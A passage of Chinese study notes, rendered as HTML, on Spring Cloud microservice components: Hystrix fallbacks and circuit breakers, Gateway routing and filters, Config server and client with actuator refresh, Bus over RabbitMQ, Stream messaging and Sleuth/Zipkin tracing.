<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="comment">// 热部署不会更新注解内容，需要重启服务</span></span><br><span class="line">    <span class="meta">@HystrixCommand(fallbackMethod=&quot;indexHandler&quot;, commandProperties=&#123;</span></span><br><span class="line"><span class="meta">        // 新增的触发熔断的条件。（新增一种超时异常）</span></span><br><span class="line"><span class="meta">        @HystrixProperty(name=&quot;exception.isolation.thread.timeoutInMilliseconds&quot;, value=&quot;3000&quot;)</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> mainService.create();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">indexHandler</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;500 error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主启动类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableHystrix</span></span><br></pre></td></tr></table></figure>

<p>也可以配置全局Fallback，防止和业务代码混在一起。如果不指明，则用默认的兜底方法，否则用特指的兜底方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@DefaultProperties(defaultFallback=&quot;methodName&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@HystrixCommand</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FeignClient(value=&quot;&quot;, fallback=MainFallbackService.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MainService</span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainFallbackService</span> <span class="keyword">implements</span> <span class="title class_">MainService</span> &#123;</span><br><span class="line">    <span class="meta">@OVerride</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">create</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this is fallback&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用断路器</p>
<p>服务提供者</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Service 层</span></span><br><span class="line"><span class="meta">@HystrixCommand(fallbackMethod=&quot;&quot;, commandProperties=&#123;</span></span><br><span class="line"><span class="meta">    // 是否开启断路器</span></span><br><span class="line"><span class="meta">    @HystrixProperty(name=&quot;circuitBreaker.enabled&quot;, value=&quot;true&quot;),</span></span><br><span class="line"><span class="meta">    // 请求次数</span></span><br><span class="line"><span class="meta">    @HystrixProperty(name=&quot;circuitBreaker.requestVolumeThreshold&quot;, value=&quot;10&quot;),</span></span><br><span class="line"><span class="meta">    // 尝试恢复周期</span></span><br><span class="line"><span class="meta">    @HystrixProperty(name=&quot;circuitBreaker.sleepWindowInMilliseconds&quot;, value=&quot;10000&quot;),</span></span><br><span class="line"><span class="meta">    // 失败率阈值</span></span><br><span class="line"><span class="meta">    @HystrixProperty(name=&quot;circuitBreaker.errorThresholdPercentage&quot;, value=&quot;60&quot;)</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>

<h2 id="服务网关"><a href="#服务网关" class="headerlink" title="服务网关"></a>服务网关</h2><p>基于过滤链过滤请求。</p>
<p>Zuul 基于阻塞IO的。</p>
<p>Gateway 基于非阻塞异步IO的。支持Reactor，WebFlux。</p>
<h3 id="Gateway"><a href="#Gateway" class="headerlink" title="Gateway"></a>Gateway</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-gateway</span><br></pre></td></tr></table></figure>

<p>但是要移除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-boot-starter-web</span><br><span class="line">spring-boot-starter-actuator</span><br></pre></td></tr></table></figure>

<p>三大核心</p>
<ul>
<li>路由 - 匹配路由</li>
<li>断言 - 判断条件是否满足</li>
<li>过滤器 - 请求前后修改请求</li>
</ul>
<p>配置一个网关</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9527</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span> </span><br><span class="line">    <span class="attr">name:</span> <span class="string">gateway</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">service1_route</span>  <span class="comment"># 路由ID</span></span><br><span class="line">        <span class="attr">uri:</span> <span class="string">http://localhost:8001</span></span><br><span class="line">        <span class="attr">predicates:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">Path=/create/**</span>  <span class="comment"># 匹配 http://localhost:8001/create/**</span></span><br><span class="line">        <span class="attr">filters:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">RewritePath=/api/(?&lt;segment&gt;.*),</span> <span class="string">/create/$\&#123;segment&#125;</span> <span class="comment"># 路径/api重写为/create</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">service2_route</span></span><br><span class="line">        <span class="attr">uri:</span> <span class="string">http://localhost:8002</span></span><br><span class="line">        <span class="attr">predicates:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">Path=/create/**</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 要注册到 注册中心</span></span><br></pre></td></tr></table></figure>

<p>主启动类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableEurekaClient</span></span><br></pre></td></tr></table></figure>

<p>业务类不需要编写。</p>
<p>也可以硬编码配置。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GatewayConfig.java</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GateWayConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RouteLocator <span class="title function_">cunstomRouteLocator</span><span class="params">(RouteLocatorBuilder builder)</span> &#123;</span><br><span class="line">        RouteLocatorBuilder.<span class="type">Burilder</span> <span class="variable">routes</span> <span class="operator">=</span>  builder.routes();</span><br><span class="line">        routes.route(<span class="string">&quot;path_route_id&quot;</span>, r -&gt; r.path(<span class="string">&quot;/path&quot;</span>).uri(<span class="string">&quot;/target&quot;</span>)).build();</span><br><span class="line">        <span class="keyword">return</span> routes.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>配置动态路由，记得引入nacos依赖</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9527</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span> </span><br><span class="line">    <span class="attr">name:</span> <span class="string">gateway</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="comment"># 从注册中心动态获取路由</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">locator:</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">service1_route</span>  <span class="comment"># 路由ID</span></span><br><span class="line">        <span class="attr">uri:</span> <span class="string">lb://provider-1.client</span></span><br><span class="line">        <span class="attr">predicates:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">Path=/create/**</span>  <span class="comment"># 微服务上的路由</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">service2_route</span></span><br><span class="line">        <span class="attr">uri:</span> <span class="string">lb://provider-2.client</span></span><br><span class="line">        <span class="attr">predicates:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">Path=/create/**</span></span><br></pre></td></tr></table></figure>

<p>predicates 可以接受的参数</p>
<ul>
<li>Path - 微服务上的路由</li>
<li>Before</li>
<li>Between</li>
<li>After - 此时间之后匹配（  ZonedDateTime.now()  ）</li>
<li>Cookie - 匹配Cookie</li>
<li>Header - 匹配头，使用正则表达式</li>
<li>Host</li>
<li>Method</li>
<li>Query</li>
</ul>
<p>配置过滤器</p>
<p>生命周期</p>
<ul>
<li>Pre - 之前</li>
<li>Post - 之后</li>
</ul>
<p>种类</p>
<ul>
<li>GatewayFilter 30+ 种</li>
<li>GlobalFilter 10+ 种</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9527</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span> </span><br><span class="line">    <span class="attr">name:</span> <span class="string">gateway</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="comment"># 从注册中心动态获取路由</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">locator:</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">service1_route</span>  <span class="comment"># 路由ID</span></span><br><span class="line">        <span class="attr">uri:</span> <span class="string">lb://provider-1.client</span></span><br><span class="line">        <span class="attr">predicates:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">Path=/create/**</span>  <span class="comment"># 微服务上的路由</span></span><br><span class="line">        <span class="attr">filters:</span></span><br><span class="line">        <span class="comment"># 一种 GatewayFilter </span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">AddRequestHeader=X-Request-red,</span> <span class="string">blue</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">service2_route</span></span><br><span class="line">        <span class="attr">uri:</span> <span class="string">lb://provider-2.client</span></span><br><span class="line">        <span class="attr">predicates:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">Path=/create/**</span></span><br></pre></td></tr></table></figure>

<p>自定义全局过滤器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogGateWayFilter</span> <span class="keyword">implements</span> <span class="title class_">GlobalFilter</span>, Ordered &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">        exchange.getRequest().getQueryParams().getFirst(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">false</span>) &#123;</span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.NOT_ACCEPTABLE);</span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 加载过滤器的顺序，越小优先级越高</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h2><ul>
<li>能够管理所有微服务的配置。</li>
<li>能够管理不同环境下的配置。（开发环境，生产环境，预发布环境）</li>
<li>运行期间动态调整配置</li>
</ul>
<h3 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h3><p>在Git上新建仓库，得到仓库地址。</p>
<p>编辑配置文件</p>
<ul>
<li>config-dev.yml</li>
<li>config-prod.yml</li>
<li>config-test.yml</li>
<li>README.MD</li>
</ul>
<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-cloud-config-server</span><br></pre></td></tr></table></figure>

<p>配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3344</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">config.center</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">server:</span></span><br><span class="line">        <span class="attr">git:</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">...</span></span><br><span class="line">          <span class="attr">search-paths:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">springcloud-config</span>  <span class="comment"># 仓库</span></span><br><span class="line">          <span class="attr">label:</span> <span class="string">master</span>  <span class="comment"># 分支</span></span><br><span class="line">   </span><br><span class="line"><span class="comment"># 注册到服务注册中心</span></span><br></pre></td></tr></table></figure>

<p>主启动类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableConfigServer</span></span><br></pre></td></tr></table></figure>

<p>配置文件使用规则</p>
<ul>
<li>&#x2F;label&#x2F;application-profile.yml<ul>
<li><code>http://config.server:3344/master/config-dev.yml</code></li>
</ul>
</li>
<li>&#x2F;application-profile.yml - 默认是 master 分支<ul>
<li><code>http://config.server:3344/config-dev.yml</code></li>
</ul>
</li>
<li>&#x2F;application&#x2F;profile&#x2F;label.yml - 得到 Json<ul>
<li><code>http://config.server:3344/config/dev/master</code></li>
</ul>
</li>
</ul>
<p>其他项目获取配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-config</span><br></pre></td></tr></table></figure>

<p>配置<code>bootstrap.yml</code>（系统级配置，比<code>application.yml</code>优先级高）</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3355</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">config.client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">label:</span> <span class="string">master</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">config</span></span><br><span class="line">      <span class="attr">profile:</span> <span class="string">dev</span></span><br><span class="line">      <span class="attr">uri:</span> <span class="string">http://localhost:3344</span></span><br><span class="line">   </span><br><span class="line"><span class="comment"># 注册到服务注册中心</span></span><br></pre></td></tr></table></figure>

<p>之后将从Config Server端拿到<code>config-dev.yml</code>配置。</p>
<p>让客户端可以动态刷新配置。</p>
<p>引入模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-boot-starter-actuator</span><br></pre></td></tr></table></figure>

<p>暴露Actuator</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">&quot;*&quot;</span></span><br></pre></td></tr></table></figure>

<p>写一个业务类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RefreshScope</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigClientController</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;config.info&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String info;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/config/info&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getConfigInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再向该应用发送一个Post请求，刷新配置。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://localhost:3355/actuator/refresh&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="服务总线"><a href="#服务总线" class="headerlink" title="服务总线"></a>服务总线</h2><p>配合Config，实现所有应用全部批量刷新。</p>
<h3 id="Bus"><a href="#Bus" class="headerlink" title="Bus"></a>Bus</h3><p>仅支持RabbitMQ，Kafka。</p>
<p>需要安装RabbitMQ（基于Erlang环境）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">rabbitmq-plugins <span class="built_in">enable</span> rabbitmq_management</span><br></pre></td></tr></table></figure>

<p>访问 <code>http://localhost:15672</code></p>
<p>登录：<code>guest</code>，<code>guest</code></p>
<p>使用Bus两种方式</p>
<ul>
<li>触发一个客户端，链式传播其他客户端</li>
<li>触发一个 Config 服务端，分发给客户端</li>
</ul>
<p>这里采用第二种方法。</p>
<p>在 Config 服务端引入包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-bus-amqp</span><br></pre></td></tr></table></figure>

<p>添加配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span> </span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">guest</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">guest</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endporints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">&#x27;bus-refresh&#x27;</span></span><br></pre></td></tr></table></figure>

<p>同时客户端也要配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-bus-amqp</span><br></pre></td></tr></table></figure>

<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span> </span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">guest</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">guest</span></span><br></pre></td></tr></table></figure>

<p>通知 Config Server 更新</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://localhost:3344/actuator/bus-refresh&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果需要定点通知</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://localhost:3344/actuator/bus-refresh/&#123;destination&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>例如</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://localhost:3344/actuator/bus-refresh/config.client:3355&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="消息驱动"><a href="#消息驱动" class="headerlink" title="消息驱动"></a>消息驱动</h2><p>用于屏蔽底层不同的消息队列的实现细节。</p>
<h3 id="Stream"><a href="#Stream" class="headerlink" title="Stream"></a>Stream</h3><p>仅支持RabbitMQ，Kafka。</p>
<p>传统MQ概念</p>
<ul>
<li>Message</li>
<li>MessageChannel</li>
<li>SubscribalChannel -&gt; MessageHandler</li>
</ul>
<p>Stream使用Binder屏蔽细节。采用发布订阅模式。</p>
<ul>
<li>Input 消费者</li>
<li>Output 生产者</li>
</ul>
<p>模块</p>
<ul>
<li>Srouce - 发送端</li>
<li>Sink - 接收端</li>
<li>Channel - 通道，队列的一种抽象</li>
<li>Binder - 绑定器，连接中间件</li>
</ul>
<p>使用</p>
<p>消息生产者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-stream-rabbit</span><br></pre></td></tr></table></figure>

<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8801</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">provider.stream</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">binders:</span></span><br><span class="line">      <span class="comment"># 被绑定的消息队列信息</span></span><br><span class="line">      <span class="attr">defaultRabbit:</span>  <span class="comment"># 名称</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">rabbit</span></span><br><span class="line">        <span class="attr">environment:</span></span><br><span class="line">          <span class="attr">spring:</span></span><br><span class="line">            <span class="attr">rabbitmq:</span></span><br><span class="line">              <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">              <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">              <span class="attr">username:</span> <span class="string">guest</span></span><br><span class="line">              <span class="attr">password:</span> <span class="string">guest</span></span><br><span class="line">    <span class="attr">bindings:</span></span><br><span class="line">      <span class="attr">output:</span></span><br><span class="line">        <span class="attr">destination:</span> <span class="string">studyExchange</span>  <span class="comment"># 通道名称</span></span><br><span class="line">        <span class="attr">content-type:</span> <span class="string">application/json</span></span><br><span class="line">        <span class="attr">binder:</span> <span class="string">defaultRabbit</span></span><br></pre></td></tr></table></figure>

<p>业务类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Service IMessageProvider</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IMessageProvider</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Impl</span></span><br><span class="line"><span class="comment">// 注意，这里不同于 Spring MVC</span></span><br><span class="line"><span class="meta">@EnableBinding(Source.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MessageProvider</span> <span class="keyword">implements</span> <span class="title class_">IMessageProvider</span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> MessageChannel output;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line">        output.send(MessageBuilder.withPayload(msg).build());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Controller</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SendMessageController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> IMessageProvider messageProvider;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/send&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> messageProvider.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>消息消费者</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8802</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">consumer.stream</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">binders:</span></span><br><span class="line">      <span class="comment"># 被绑定的消息队列信息</span></span><br><span class="line">      <span class="attr">defaultRabbit:</span>  <span class="comment"># 名称</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">rabbit</span></span><br><span class="line">        <span class="attr">environment:</span></span><br><span class="line">          <span class="attr">spring:</span></span><br><span class="line">            <span class="attr">rabbitmq:</span></span><br><span class="line">              <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">              <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">              <span class="attr">username:</span> <span class="string">guest</span></span><br><span class="line">              <span class="attr">password:</span> <span class="string">guest</span></span><br><span class="line">    <span class="attr">bindings:</span></span><br><span class="line">      <span class="attr">input:</span></span><br><span class="line">        <span class="attr">destination:</span> <span class="string">studyExchange</span>  <span class="comment"># 通道名称</span></span><br><span class="line">        <span class="attr">content-type:</span> <span class="string">application/json</span></span><br><span class="line">        <span class="attr">binder:</span> <span class="string">defaultRabbit</span></span><br></pre></td></tr></table></figure>

<p>业务类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Controller</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@EnableBinding(Sink.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReceiveMessageController</span> &#123;</span><br><span class="line">    <span class="meta">@StreamListener(Sink.INPUT)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">input</span><span class="params">(Message&lt;String&gt; message)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> message.getPayload();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>当有多个消费者时，会有问题：</p>
<ul>
<li>重复消费 - 同一个Group下的消费者是竞争关系，在同一个组下可保证消息只被消费一次。</li>
<li>消息持久化</li>
</ul>
<p>也就是默认每个消费者都在不同的组，需要配置到相同组内。设置分组后，还会消息持久化。</p>
<p>修改配置，设置为轮询接收消息</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">bindings:</span></span><br><span class="line">  <span class="attr">input:</span></span><br><span class="line">    <span class="attr">destination:</span> <span class="string">studyExchange</span>  <span class="comment"># 通道名称</span></span><br><span class="line">    <span class="attr">content-type:</span> <span class="string">application/json</span></span><br><span class="line">    <span class="attr">binder:</span> <span class="string">defaultRabbit</span></span><br><span class="line">	<span class="attr">group:</span> <span class="string">groupA</span>  <span class="comment"># 添加组名</span></span><br></pre></td></tr></table></figure>

<h2 id="分布式请求拦路跟踪"><a href="#分布式请求拦路跟踪" class="headerlink" title="分布式请求拦路跟踪"></a>分布式请求拦路跟踪</h2><p>跟踪微服务之间的调用请求。</p>
<h3 id="Sleuth"><a href="#Sleuth" class="headerlink" title="Sleuth"></a>Sleuth</h3><p>可视化框架：Zipkin</p>
<p>搭建</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载运行 zipkin </span></span><br><span class="line">java -jar zipkin-server-2.xx.xx-exec.jar</span><br></pre></td></tr></table></figure>

<p>访问：<code>http://localhost:9411/zipkin</code></p>
<p>Trace是一条树结构，一条链路标识一个Trace ID。</p>
<p>Span标识发起的请求信息，Span之间通过Parent ID关联，就像链表。每个Span节点表示一个微服务。</p>
<p>使用（同时包含 zipkin  sleuth）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-zipkin</span><br></pre></td></tr></table></figure>

<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">zipkin:</span></span><br><span class="line">    <span class="attr">base-url:</span> <span class="string">http://localhost:9411</span></span><br><span class="line">  <span class="attr">sleuth:</span></span><br><span class="line">    <span class="attr">sampler:</span> </span><br><span class="line">      <span class="attr">probability:</span> <span class="number">1</span>  <span class="comment"># 采样率，1 为全部采集</span></span><br></pre></td></tr></table></figure>



<h2 id="Spring-Cloud-Alibaba"><a href="#Spring-Cloud-Alibaba" class="headerlink" title="Spring Cloud Alibaba"></a>Spring Cloud Alibaba</h2><p>由于Spring Cloud Netflix进入维护模式，因此需要Alibaba</p>
<p><a href="https://spring.io/projects/spring-cloud-alibaba">https://spring.io/projects/spring-cloud-alibaba</a></p>
<p>内容包括</p>
<ul>
